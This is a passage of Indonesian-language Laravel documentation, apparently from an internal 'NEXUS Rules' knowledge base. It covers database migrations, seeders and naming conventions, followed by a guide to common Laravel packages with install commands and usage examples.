| Tanggal + waktu | `$table->dateTime('published_at')` |
| Timestamp (auto) | `$table->timestamps()` |
| Soft delete | `$table->softDeletes()` |
| Foreign key | `$table->foreignId('user_id')->constrained()` |
| Enum | `$table->enum('status', ['draft', 'published', 'archived'])` |
| JSON | `$table->json('metadata')->nullable()` |
| Nomor HP | `$table->string('phone', 20)->nullable()` |

> **Catatan nomor HP:** Selalu pakai `string`, bukan `integer`. Nomor HP bisa diawali `0` atau `+62`, angka tidak bisa menyimpan itu.

---

## 4. Seeder & Factory

### Membuat Seeder

```bash
php artisan make:seeder ProductSeeder
```

Isi `database/seeders/ProductSeeder.php`:

```php
<?php

namespace Database\Seeders;

use App\Models\Product;
use Illuminate\Database\Seeder;

class ProductSeeder extends Seeder
{
    public function run(): void
    {
        Product::create([
            'name'        => 'Produk Contoh',
            'description' => 'Deskripsi produk pertama',
            'price'       => 50000,
            'is_active'   => true,
        ]);
    }
}
```

Daftarkan di `DatabaseSeeder.php`:

```php
public function run(): void
{
    $this->call([
        ProductSeeder::class,
    ]);
}
```

Jalankan:

```bash
php artisan db:seed
# atau spesifik satu seeder:
php artisan db:seed --class=ProductSeeder
```

---

### Membuat Factory (untuk data dummy massal)

```bash
php artisan make:factory ProductFactory --model=Product
```

Isi `database/factories/ProductFactory.php`:

```php
<?php

namespace Database\Factories;

use Illuminate\Database\Eloquent\Factories\Factory;

class ProductFactory extends Factory
{
    public function definition(): array
    {
        return [
            'name'        => $this->faker->words(3, true),
            'description' => $this->faker->paragraph(),
            'price'       => $this->faker->numberBetween(10000, 500000),
            'is_active'   => $this->faker->boolean(80), // 80% kemungkinan true
        ];
    }
}
```

Pakai di Seeder:

```php
// Generate 50 data dummy
Product::factory()->count(50)->create();
```

---

## 5. Menambah Kolom Baru

### ⚠️ Aturan Penting

> **Jangan edit file migration lama yang sudah di-migrate.**
> Selalu buat file migration baru dengan prefix `add_` atau `add_kolom_to_`.

### Perintah

```bash
php artisan make:migration add_phone_to_users_table
```

### Struktur File

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            // Tambah kolom phone setelah kolom 'name'
            $table->string('phone', 20)->nullable()->after('name');
        });
    }

    public function down(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('phone');
        });
    }
};
```

> **`->after('nama_kolom')`** — opsional tapi bagus untuk menjaga urutan kolom rapi.
> **`->nullable()`** — wajib kalau data lama belum punya value untuk kolom ini. Kalau tidak nullable, migration akan gagal karena row lama tidak punya value.

### Jalankan

```bash
php artisan migrate
```

---

## 6. Menghapus Kolom

### Perintah

```bash
php artisan make:migration remove_email_from_users_table
```

### Struktur File

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropColumn('email');
        });
    }

    public function down(): void
    {
        // Kembalikan kolom kalau di-rollback
        Schema::table('users', function (Blueprint $table) {
            $table->string('email')->unique()->after('name');
        });
    }
};
```

### Hapus Beberapa Kolom Sekaligus

```php
$table->dropColumn(['email', 'email_verified_at']);
```

> **Catatan:** Kalau ada index atau unique constraint di kolom tersebut, harus drop index-nya dulu sebelum drop kolom.

```php
// Drop unique index dulu, baru drop kolom
$table->dropUnique(['email']);
$table->dropColumn('email');
```

---

## 7. Mengganti Nama Kolom

```bash
php artisan make:migration rename_phone_number_to_phone_in_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->renameColumn('phone_number', 'phone');
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->renameColumn('phone', 'phone_number');
    });
}
```

---

## 8. Rollback & Fresh Migration

| Perintah | Fungsi |
|---|---|
| `php artisan migrate` | Jalankan migration yang belum dijalankan |
| `php artisan migrate:rollback` | Undo batch migration terakhir |
| `php artisan migrate:rollback --step=3` | Undo 3 batch terakhir |
| `php artisan migrate:reset` | Rollback semua migration |
| `php artisan migrate:fresh` | Drop semua tabel, migrate ulang dari awal |
| `php artisan migrate:fresh --seed` | Fresh + jalankan semua seeder |
| `php artisan migrate:status` | Lihat status tiap migration |

> **⚠️ `migrate:fresh` akan menghapus semua data.** Hanya boleh dipakai di local/development. **Dilarang keras di production.**

---

## 9. Contoh Kasus: Tabel Users — Tambah `phone`, Hapus `email`

Ini skenario nyata: kamu punya tabel `users` default Laravel yang punya kolom `email`, dan sekarang mau:
- ✅ Tambah kolom `phone`
- ❌ Hapus kolom `email` dan `email_verified_at`

### Langkah 1 — Buat migration untuk tambah `phone`

```bash
php artisan make:migration add_phone_to_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->string('phone', 20)->nullable()->unique()->after('name');
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->dropColumn('phone');
    });
}
```

### Langkah 2 — Buat migration untuk hapus `email`

```bash
php artisan make:migration remove_email_from_users_table
```

```php
public function up(): void
{
    Schema::table('users', function (Blueprint $table) {
        // Drop unique index email dulu sebelum drop kolom
        $table->dropUnique(['email']);
        $table->dropColumn(['email', 'email_verified_at']);
    });
}

public function down(): void
{
    Schema::table('users', function (Blueprint $table) {
        $table->string('email')->unique()->after('name');
        $table->timestamp('email_verified_at')->nullable()->after('email');
    });
}
```

### Langkah 3 — Update Model `User.php`

Setelah migration, update `$fillable` di Model:

```php
protected $fillable = [
    'name',
    'phone',     // ✅ tambah
    'password',
    // 'email',  // ❌ hapus
];
```

Kalau pakai `$hidden`:

```php
protected $hidden = [
    'password',
    'remember_token',
    // 'email', // ❌ hapus dari hidden juga kalau ada
];
```

### Langkah 4 — Update Seeder (kalau ada)

```php
User::create([
    'name'     => 'Admin',
    'phone'    => '08123456789',   // ✅ pakai phone
    'password' => bcrypt('secret'),
    // 'email' => tidak perlu lagi
]);
```

### Langkah 5 — Jalankan

```bash
php artisan migrate
```

---

## 10. Aturan Penamaan

| Yang dibuat | Format | Contoh |
|---|---|---|
| File migration buat tabel | `create_{nama_tabel}_table` | `create_products_table` |
| File migration tambah kolom | `add_{kolom}_to_{tabel}_table` | `add_phone_to_users_table` |
| File migration hapus kolom | `remove_{kolom}_from_{tabel}_table` | `remove_email_from_users_table` |
| File migration ubah kolom | `change_{kolom}_in_{tabel}_table` | `change_price_in_products_table` |
| File migration rename kolom | `rename_{lama}_to_{baru}_in_{tabel}_table` | `rename_phone_number_to_phone_in_users_table` |
| Nama tabel di database | `snake_case`, plural | `user_profiles`, `order_items` |
| Nama kolom | `snake_case` | `created_at`, `phone_number` |
| Nama Model | `PascalCase`, singular | `UserProfile`, `OrderItem` |
| Nama Seeder | `{Model}Seeder` | `UserSeeder`, `ProductSeeder` |
| Nama Factory | `{Model}Factory` | `UserFactory`, `ProductFactory` |

---

> 📌 **Ingat selalu:** Database migration adalah *sejarah* perubahan skema. Jangan hapus, jangan edit yang lama — cukup tambah yang baru.

---

*Dokumen ini bagian dari NEXUS Rules — TALL Stack Standards*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, vcs]

### 📘 KNOWLEDGE: NEXUS_LARAVEL_DEPENDENCIES_GUIDE.MD

# 📦 Laravel Dependencies & Packages — Panduan Lengkap
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> Referensi semua package Laravel yang umum dipakai — dari UI framework, auth,
> role & permission, media, sampai utility. Lengkap dengan kegunaan, install command,
> dan kapan harus pakai / tidak pakai.
>
> **Berlaku untuk: Laravel 10+ / Laravel 12 (TALL Stack)**

---

## 📋 Daftar Isi

1. [UI & Component Framework](#1-ui--component-framework)
2. [Authentication & Authorization](#2-authentication--authorization)
3. [Admin Panel](#3-admin-panel)
4. [Role & Permission](#4-role--permission)
5. [Media & File Management](#5-media--file-management)
6. [Activity Log & Audit Trail](#6-activity-log--audit-trail)
7. [Settings & Configuration](#7-settings--configuration)
8. [SEO & Metadata](#8-seo--metadata)
9. [Image Processing](#9-image-processing)
10. [PDF & Export](#10-pdf--export)
11. [Notification & Email](#11-notification--email)
12. [API & Utility](#12-api--utility)
13. [Testing](#13-testing)
14. [Development Tools](#14-development-tools)
15. [Tabel Perbandingan Cepat](#15-tabel-perbandingan-cepat)
16. [Stack Rekomendasi per Jenis Project](#16-stack-rekomendasi-per-jenis-project)

---

## 1. UI & Component Framework

---

### 🔵 Livewire

| Detail | Info |
|---|---|
| **Package** | `livewire/livewire` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Caleb Porzio |

**Kegunaan:**
Framework full-stack untuk membangun UI interaktif di Laravel tanpa menulis JavaScript. Komponen PHP yang bereaksi seperti JavaScript — form realtime, live search, counter, wizard step, modal, dan sebagainya.

**Install:**
```bash
composer require livewire/livewire
```

**Buat komponen:**
```bash
php artisan make:livewire NamaKomponen
```

**Kapan pakai:**
- App internal, dashboard, CRUD yang butuh interaktivitas tanpa SPA penuh
- Tim yang kuat PHP tapi tidak terlalu dalam JS
- Cocok dikombinasi dengan Alpine.js untuk UI ringan

**Kapan TIDAK pakai:**
- Butuh realtime ekstrem (chat live, collaborative editing) — pertimbangkan WebSocket
- App yang sangat berat di sisi client

---

### 🟡 Alpine.js

| Detail | Info |
|---|---|
| **Package** | CDN / via npm: `alpinejs` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Caleb Porzio |

**Kegunaan:**
JavaScript minimal (disebut "Tailwind-nya JavaScript") untuk interaksi UI ringan: toggle, dropdown, modal, tab, accordion — langsung di HTML attribute. Tidak butuh build step kalau pakai CDN.

**Install via npm:**
```bash
npm install alpinejs
```

**Via CDN (taruh di layout blade):**
```html
<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
```

**Kapan pakai:**
- Semua project TALL Stack — Alpine adalah bagian dari stack
- Interaksi sederhana yang tidak perlu full Vue/React

---

### 🔵 Inertia.js

| Detail | Info |
|---|---|
| **Package** | `inertiajs/inertia-laravel` |
| **Frontend** | React / Vue / Svelte |

**Kegunaan:**
Jembatan antara Laravel backend dan React/Vue frontend — tanpa REST API terpisah. Routing tetap di Laravel, tapi view di-render oleh React/Vue. Disebut "the modern monolith".

**Install:**
```bash
composer require inertiajs/inertia-laravel
npm install @inertiajs/react  # atau @inertiajs/vue3
```

**Kapan pakai:**
- Tim yang sudah familiar React/Vue tapi tidak mau buat API terpisah
- App yang butuh UX SPA penuh tapi tetap pakai Laravel routing

**Kapan TIDAK pakai:**
- Project yang sudah pakai Livewire — pilih salah satu, jangan campur tanpa alasan kuat

---

### 🟠 Tailwind CSS

| Detail | Info |
|---|---|
| **Package** | `npm install tailwindcss` |
| **Versi Stabil** | v4.x |

**Kegunaan:**
Utility-first CSS framework. Tidak ada class `.btn-primary` yang pre-defined — semua dibangun dari utility class seperti `flex`, `p-4`, `text-lg`, `bg-blue-500`.

**Install:**
```bash
npm install tailwindcss @tailwindcss/vite
```

**Kapan pakai:**
- Semua project TALL Stack — Tailwind adalah bagian dari stack
- Custom design yang tidak mau terikat Bootstrap/Bulma

---

---

## 2. Authentication & Authorization

---

### 🟢 Laravel Breeze

| Detail | Info |
|---|---|
| **Package** | `laravel/breeze` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Starter kit auth yang **minimal dan ringan** — login, register, forgot password, email verification. Stack pilihan: Blade, Livewire, React (Inertia), Vue (Inertia), atau API-only.

**Install:**
```bash
composer require laravel/breeze --dev
php artisan breeze:install

# Pilih stack:
# blade | livewire | react | vue | api
php artisan breeze:install livewire

php artisan migrate
npm install && npm run dev
```

**Kapan pakai:**
- Project baru yang butuh auth sederhana dan bisa dikustomisasi bebas
- Titik awal yang bersih, tidak banyak bloat

---

### 🔴 Laravel Jetstream

| Detail | Info |
|---|---|
| **Package** | `laravel/jetstream` |
| **Dibuat oleh** | Laravel Official |
| **Stack** | Livewire atau Inertia (Vue) |

**Kegunaan:**
Starter kit auth yang **lengkap dan fitur-rich** — login, register, 2FA, session management, profile photo, API token (Sanctum), dan **team management** (opsional).

**Install:**
```bash
composer require laravel/jetstream
php artisan jetstream:install livewire   # atau: inertia

# Dengan fitur teams:
php artisan jetstream:install livewire --teams

php artisan migrate
npm install && npm run dev
```

**Fitur bawaan Jetstream:**
- ✅ Login / Register / Forgot Password
- ✅ Email Verification
- ✅ Two-Factor Authentication (2FA)
- ✅ Session Management (lihat semua device aktif)
- ✅ Profile Management + Upload Foto
- ✅ API Token via Laravel Sanctum
- ✅ Team Management (opsional)

**Kapan pakai:**
- SaaS app, project yang butuh 2FA, multi-user dengan teams
- Tidak mau setup auth dari awal

**Kapan TIDAK pakai:**
- App sederhana — terlalu berat, banyak file yang tidak dipakai
- Lebih baik pakai Breeze kalau tidak butuh semua fitur ini

---

### 🟣 Laravel Sanctum

| Detail | Info |
|---|---|
| **Package** | `laravel/sanctum` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Autentikasi ringan untuk SPA (Single Page Application) dan API. Bisa issue API token sederhana tanpa OAuth penuh. Jetstream sudah include Sanctum.

**Install:**
```bash
composer require laravel/sanctum
php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
php artisan migrate
```

**Kapan pakai:**
- REST API yang dikonsumsi mobile app atau frontend SPA
- Token-based auth yang sederhana

---

### 🔵 Laravel Passport

| Detail | Info |
|---|---|
| **Package** | `laravel/passport` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
OAuth 2.0 server penuh untuk Laravel. Bisa buat authorization server sendiri dengan grant types: Authorization Code, Client Credentials, Password Grant, Implicit, Refresh Token.

**Install:**
```bash
composer require laravel/passport
php artisan passport:install
```

**Kapan pakai:**
- Platform yang butuh OAuth 2.0 standar — misalnya third-party app perlu akses API user-mu
- Enterprise, marketplace, ekosistem yang punya banyak client

**Kapan TIDAK pakai:**
- App internal biasa — terlalu overkill, pakai Sanctum saja

---

---

## 3. Admin Panel

---

### 🟠 Filament

| Detail | Info |
|---|---|
| **Package** | `filament/filament` |
| **Versi Stabil** | v3.x |
| **Dibuat oleh** | Dan Harrin & Community |

**Kegunaan:**
Admin panel lengkap berbasis TALL Stack (Tailwind + Alpine + Livewire) — bisa generate CRUD resource, form builder, table builder, widget dashboard, dan banyak plugin ekosistem. Salah satu admin panel terpopuler di Laravel.

**Install (panel admin):**
```bash
composer require filament/filament:"^3.2" -W
php artisan filament:install --panels
php artisan make:filament-user
```

**Buat Resource (CRUD otomatis):**
```bash
php artisan make:filament-resource Product --generate
```

**Komponen utama Filament:**
| Komponen | Kegunaan |
|---|---|
| **Resource** | CRUD otomatis untuk 1 model |
| **Page** | Halaman custom (dashboard, settings) |
| **Widget** | Widget statistik di dashboard |
| **Form Builder** | Form component (TextInput, Select, FileUpload, dll) |
| **Table Builder** | Tabel dengan filter, sort, bulk action |
| **Action** | Tombol + modal (confirm, form, redirect) |
| **Notification** | Toast notification |
| **Infolist** | Detail view read-only |

**Plugin populer Filament:**
```bash
# Shield — Role & Permission terintegrasi Filament
composer require bezhansalleh/filament-shield

# Excel Export
composer require pxlrbt/filament-excel

# Activity Log
composer require z3d0x/filament-logger
```

**Kapan pakai:**
- Admin panel untuk client / internal tim
- Butuh CRUD cepat tanpa banyak custom code
- Dashboard dengan statistik dan widget

---

### 🟡 Nova (Laravel Official)

| Detail | Info |
|---|---|
| **Package** | `laravel/nova` |
| **Harga** | **Berbayar** ($199/project atau $299 unlimited) |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Admin panel resmi dari Laravel team. Lebih "official" dari Filament, desain lebih premium, tapi berbayar.

**Kapan pakai:**
- Budget ada, mau admin panel dengan support resmi Laravel
- Tim yang lebih nyaman dengan ekosistem official

**Kapan TIDAK pakai:**
- Budget terbatas — Filament gratis dan fiturnya tidak kalah jauh

---

---

## 4. Role & Permission

---

### 🟣 Spatie Laravel Permission

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-permission` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Role & permission management untuk Laravel. Bisa assign role ke user, bisa assign permission ke role atau langsung ke user. Terintegrasi dengan gate/policy Laravel.

**Install:**
```bash
composer require spatie/laravel-permission
php artisan vendor:publish --provider="Spatie\Permission\PermissionServiceProvider"
php artisan migrate
```

**Setup Model User:**
```php
use Spatie\Permission\Traits\HasRoles;

class User extends Authenticatable
{
    use HasRoles;
}
```

**Penggunaan dasar:**
```php
// Buat role & permission
Role::create(['name' => 'admin']);
Permission::create(['name' => 'edit posts']);

// Assign ke user
$user->assignRole('admin');
$user->givePermissionTo('edit posts');

// Cek di blade
@role('admin') ... @endrole
@can('edit posts') ... @endcan

// Cek di controller
$user->hasRole('admin');
$user->can('edit posts');
```

**Kapan pakai:**
- Hampir semua project yang punya lebih dari 1 tipe user
- Admin panel, SaaS, dashboard multi-role

---

---

## 5. Media & File Management

---

### 🟢 Spatie Laravel Media Library

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-medialibrary` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Manajemen file/media yang powerful — upload file, attach ke model Eloquent, konversi otomatis (resize, crop, watermark), support disk (local, S3, R2, dll).

**Install:**
```bash
composer require spatie/laravel-medialibrary
php artisan vendor:publish --provider="Spatie\MediaLibrary\MediaLibraryServiceProvider" --tag="medialibrary-migrations"
php artisan migrate
```

**Setup Model:**
```php
use Spatie\MediaLibrary\HasMedia;
use Spatie\MediaLibrary\InteractsWithMedia;

class Product extends Model implements HasMedia
{
    use InteractsWithMedia;

    public function registerMediaCollections(): void
    {
        $this->addMediaCollection('images');
        $this->addMediaCollection('documents')->singleFile();
    }
}
```

**Penggunaan:**
```php
// Upload
$product->addMedia($request->file('image'))->toMediaCollection('images');

// Ambil
$product->getFirstMediaUrl('images');
$product->getMedia('images');
```

**Kapan pakai:**
- Project yang punya banyak upload file (foto produk, dokumen, avatar)
- Butuh resize/konversi otomatis
- Mau file terorganisir per model

---

### 🔵 Intervention Image

| Detail | Info |
|---|---|
| **Package** | `intervention/image` |
| **Versi** | v3.x |

**Kegunaan:**
Manipulasi gambar — resize, crop, rotate, filter, watermark, convert format. Biasanya dipakai bersamaan dengan Media Library untuk konversi otomatis.

**Install:**
```bash
composer require intervention/image
```

**Penggunaan:**
```php
use Intervention\Image\ImageManager;
use Intervention\Image\Drivers\Gd\Driver;

$manager = new ImageManager(new Driver());
$image = $manager->read('foto.jpg');
$image->resize(300, 200)->save('thumb.jpg');
```

---

---

## 6. Activity Log & Audit Trail

---

### 📋 Spatie Laravel Activity Log

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-activitylog` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Mencatat semua aktivitas user di aplikasi — siapa yang create/update/delete model apa, kapan, dan apa yang berubah (before/after). Essential untuk audit trail.

**Install:**
```bash
composer require spatie/laravel-activitylog
php artisan vendor:publish --provider="Spatie\Activitylog\ActivitylogServiceProvider" --tag="activitylog-migrations"
php artisan migrate
```

**Setup Model (auto log):**
```php
use Spatie\Activitylog\Traits\LogsActivity;
use Spatie\Activitylog\LogOptions;

class Product extends Model
{
    use LogsActivity;

    public function getActivitylogOptions(): LogOptions
    {
        return LogOptions::defaults()
            ->logOnly(['name', 'price', 'is_active'])  // kolom yang dicatat
            ->logOnlyDirty();                           // hanya yang berubah
    }
}
```

**Log manual:**
```php
activity()
    ->causedBy($user)
    ->performedOn($product)
    ->log('updated price');
```

---

---

## 7. Settings & Configuration

---

### ⚙️ Spatie Laravel Settings

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-settings` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Menyimpan settings aplikasi di database (bukan `.env`), dengan type-safety. Cocok untuk settings yang bisa diubah via admin panel — nama app, SMTP, toggle fitur, dll.

**Install:**
```bash
composer require spatie/laravel-settings
php artisan vendor:publish --provider="Spatie\LaravelSettings\LaravelSettingsServiceProvider" --tag="migrations"
php artisan migrate
```

**Buat Settings Class:**
```php
// php artisan make:settings GeneralSettings
use Spatie\LaravelSettings\Settings;

class GeneralSettings extends Settings
{
    public string $site_name;
    public string $site_tagline;
    public bool   $maintenance_mode;

    public static function group(): string
    {
        return 'general';
    }
}
```

**Pakai di mana saja:**
```php
$settings = app(GeneralSettings::class);
echo $settings->site_name;

$settings->site_name = 'Nama Baru';
$settings->save();
```

---

---

## 8. SEO & Metadata

---

### 🔍 Spatie Laravel Sitemap

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-sitemap` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Generate sitemap XML otomatis dari route/model Laravel. Support multi-sitemap, image sitemap, news sitemap.

**Install:**
```bash
composer require spatie/laravel-sitemap
```

**Generate sitemap:**
```php
use Spatie\Sitemap\Sitemap;
use Spatie\Sitemap\Tags\Url;

Sitemap::create()
    ->add(Url::create('/'))
    ->add(Url::create('/about'))
    ->add(Post::all())   // kalau model implement toSitemapTag()
    ->writeToFile(public_path('sitemap.xml'));
```

---

### 🏷️ RalphJSmit Laravel SEO

| Detail | Info |
|---|---|
| **Package** | `ralphjsmit/laravel-seo` |

**Kegunaan:**
Manajemen meta tag SEO (title, description, OG tags, Twitter card, JSON-LD) per halaman/model. Terintegrasi dengan Filament.

**Install:**
```bash
composer require ralphjsmit/laravel-seo
php artisan vendor:publish --tag="seo-migrations"
php artisan migrate
```

---

---

## 9. Image Processing

---

### 🖼️ Spatie Image

| Detail | Info |
|---|---|
| **Package** | `spatie/image` |
| **Dibuat oleh** | Spatie |

**Kegunaan:**
Manipulasi gambar berbasis Intervention Image tapi dengan API yang lebih bersih dan terintegrasi baik dengan Media Library.

**Install:**
```bash
composer require spatie/image
```

---

---

## 10. PDF & Export

---

### 📄 DomPDF (Laravel Snappy / Barryvdh)

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-dompdf` |
| **Dibuat oleh** | Barry vd. Heuvel |

**Kegunaan:**
Generate PDF dari Blade view. Paling mudah di-setup, tapi kurang baik untuk layout kompleks dengan CSS modern.

**Install:**
```bash
composer require barryvdh/laravel-dompdf
```

**Penggunaan:**
```php
use Barryvdh\DomPDF\Facade\Pdf;

$pdf = Pdf::loadView('pdf.invoice', ['data' => $data]);
return $pdf->download('invoice.pdf');
```

---

### 📊 Maatwebsite Laravel Excel

| Detail | Info |
|---|---|
| **Package** | `maatwebsite/excel` |
| **Dibuat oleh** | Maatwebsite |

**Kegunaan:**
Import & export Excel/CSV dari/ke Laravel. Support collection, query builder, generator untuk data besar, event system.

**Install:**
```bash
composer require maatwebsite/excel
php artisan vendor:publish --provider="Maatwebsite\Excel\ExcelServiceProvider" --tag=config
```

**Export:**
```php
// php artisan make:export UsersExport --model=User
use Maatwebsite\Excel\Facades\Excel;

return Excel::download(new UsersExport, 'users.xlsx');
```

**Import:**
```php
// php artisan make:import UsersImport --model=User
Excel::import(new UsersImport, $request->file('file'));
```

---

---

## 11. Notification & Email

---

### 📧 Laravel Notification Channels

| Detail | Info |
|---|---|
| **Package** | Berbeda per channel |
| **Sumber** | [laravel-notification-channels.com](https://laravel-notification-channels.com) |

**Channel populer:**
```bash
# WhatsApp via Twilio
composer require laravel-notification-channels/twilio

# Telegram
composer require laravel-notification-channels/telegram

# Firebase Push Notification
composer require laravel-notification-channels/fcm

# Slack
composer require laravel-notification-channels/slack
```

---

### 📬 Spatie Laravel Mailcoach

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-mailcoach` |
| **Dibuat oleh** | Spatie |
| **Harga** | Freemium (self-hosted gratis, SaaS berbayar) |

**Kegunaan:**
Email marketing & newsletter platform yang bisa self-hosted di Laravel sendiri. List management, campaign, automation, analytics.

---

---

## 12. API & Utility

---

### 🔄 Laravel Telescope

| Detail | Info |
|---|---|
| **Package** | `laravel/telescope` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Debug tool untuk development — monitor semua request, query, job, mail, notification, log, exception, dll via UI web. **Hanya untuk development.**

**Install:**
```bash
composer require laravel/telescope --dev
php artisan telescope:install
php artisan migrate
```

---

### 🔎 Laravel Debugbar

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-debugbar` |

**Kegunaan:**
Toolbar debug di browser — query count, query time, views yang diload, binding, dll. Sangat berguna untuk optimasi.

**Install:**
```bash
composer require barryvdh/laravel-debugbar --dev
```

---

### ⚡ Laravel Horizon

| Detail | Info |
|---|---|
| **Package** | `laravel/horizon` |
| **Requirement** | Redis |

**Kegunaan:**
Dashboard monitoring untuk queue/job Laravel yang pakai Redis driver. Lihat job pending, failed, throughput, waktu eksekusi.

**Install:**
```bash
composer require laravel/horizon
php artisan horizon:install
php artisan horizon
```

---

### 🔗 Laravel Socialite

| Detail | Info |
|---|---|
| **Package** | `laravel/socialite` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
OAuth login via provider eksternal — Google, Facebook, GitHub, Twitter, LinkedIn, dll.

**Install:**
```bash
composer require laravel/socialite
# Provider tambahan:
composer require socialiteproviders/google
```

---

### 🌐 Spatie Laravel Translatable

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-translatable` |

**Kegunaan:**
Multi-language support untuk model — simpan terjemahan di kolom JSON, akses dengan `$model->getTranslation('name', 'id')`.

**Install:**
```bash
composer require spatie/laravel-translatable
```

---

### 🔢 Spatie Laravel Query Builder

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-query-builder` |

**Kegunaan:**
Build Eloquent query dari request parameter — filter, sort, include relasi, semua via URL parameter. Sangat berguna untuk REST API.

**Install:**
```bash
composer require spatie/laravel-query-builder
```

**Contoh:**
```php
// GET /users?filter[name]=john&sort=-created_at&include=posts
$users = QueryBuilder::for(User::class)
    ->allowedFilters(['name', 'email'])
    ->allowedSorts(['name', 'created_at'])
    ->allowedIncludes(['posts'])
    ->paginate();
```

---

### 🗂️ Laravel Sluggable (Spatie)

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-sluggable` |

**Kegunaan:**
Auto-generate slug dari field model — `"Judul Artikel Ini"` → `"judul-artikel-ini"`. Support unique slug otomatis.

**Install:**
```bash
composer require spatie/laravel-sluggable
```

---

### 🔐 Spatie Laravel Backup

| Detail | Info |
|---|---|
| **Package** | `spatie/laravel-backup` |

**Kegunaan:**
Backup database + file ke berbagai storage (local, S3, Dropbox, dll). Bisa di-schedule otomatis. Support notifikasi kalau backup gagal.

**Install:**
```bash
composer require spatie/laravel-backup
php artisan vendor:publish --provider="Spatie\Backup\BackupServiceProvider"
```

**Jalankan:**
```bash
php artisan backup:run
php artisan backup:run --only-db   # hanya database
```

---

---

## 13. Testing

---

### 🧪 Pest PHP

| Detail | Info |
|---|---|
| **Package** | `pestphp/pest` |

**Kegunaan:**
Testing framework modern untuk PHP — syntax lebih bersih dari PHPUnit, support plugin (Coverage, Livewire, Faker, Stress, dll). Laravel 11+ sudah default Pest.

**Install:**
```bash
composer require pestphp/pest --dev --with-all-dependencies
php artisan pest:install

# Plugin:
composer require pestphp/pest-plugin-laravel --dev
composer require pestphp/pest-plugin-livewire --dev
```

**Contoh test:**
```php
it('can create a product', function () {
    $response = $this->post('/products', [
        'name'  => 'Test Product',
        'price' => 10000,
    ]);

    $response->assertRedirect('/products');
    $this->assertDatabaseHas('products', ['name' => 'Test Product']);
});
```

---

---

## 14. Development Tools

---

### 🛠️ Laravel IDE Helper

| Detail | Info |
|---|---|
| **Package** | `barryvdh/laravel-ide-helper` |

**Kegunaan:**
Generate file helper untuk IDE (PHPStorm, VS Code) agar autocomplete model, facade, dan method bekerja dengan benar.

**Install:**
```bash
composer require barryvdh/laravel-ide-helper --dev
php artisan ide-helper:generate     # facade
php artisan ide-helper:models       # model
php artisan ide-helper:eloquent     # eloquent builder
```

---

### 🎨 Laravel Pint

| Detail | Info |
|---|---|
| **Package** | `laravel/pint` |
| **Dibuat oleh** | Laravel Official |

**Kegunaan:**
Code style fixer otomatis berbasis PHP-CS-Fixer. Sudah include di Laravel 9+. Jalankan untuk format ulang kode sesuai standar.

**Jalankan:**
```bash
./vendor/bin/pint
./vendor/bin/pint --dirty    # hanya file yang berubah
```

---

---

## 15. Tabel Perbandingan Cepat

| Package | Vendor | Harga | Kegunaan Utama |
|---|---|---|---|
| Livewire | Caleb Porzio | Gratis | UI interaktif tanpa JS |
| Alpine.js | Caleb Porzio | Gratis | Interaksi UI ringan |
| Inertia.js | Jonathan Reinink | Gratis | SPA dengan backend Laravel |
| Tailwind CSS | Tailwind Labs | Gratis | Utility-first CSS |
| Breeze | Laravel | Gratis | Auth starter kit minimal |
| Jetstream | Laravel | Gratis | Auth starter kit lengkap + teams |
| Sanctum | Laravel | Gratis | Auth API / SPA ringan |
| Passport | Laravel | Gratis | OAuth 2.0 server penuh |
| Filament | Dan Harrin | Gratis | Admin panel TALL Stack |
| Nova | Laravel | **Berbayar** | Admin panel official |
| Spatie Permission | Spatie | Gratis | Role & permission |
| Spatie Media Library | Spatie | Gratis | Upload & manajemen file |
| Spatie Activity Log | Spatie | Gratis | Audit trail |
| Spatie Settings | Spatie | Gratis | Settings di database |
| Spatie Backup | Spatie | Gratis | Backup DB & file |
| Spatie Sitemap | Spatie | Gratis | Generate sitemap XML |
| Spatie Query Builder | Spatie | Gratis | Filter/sort API via URL |
| Spatie Sluggable | Spatie | Gratis | Auto-generate slug |
| Spatie Translatable | Spatie | Gratis | Multi-language model |
| Barryvdh DomPDF | Barry vd. Heuvel | Gratis | Generate PDF |
| Maatwebsite Excel | Maatwebsite | Gratis | Import/export Excel |
| Intervention Image | Oliver Vogel | Gratis | Manipulasi gambar |
| Telescope | Laravel | Gratis | Debug tool (dev only) |
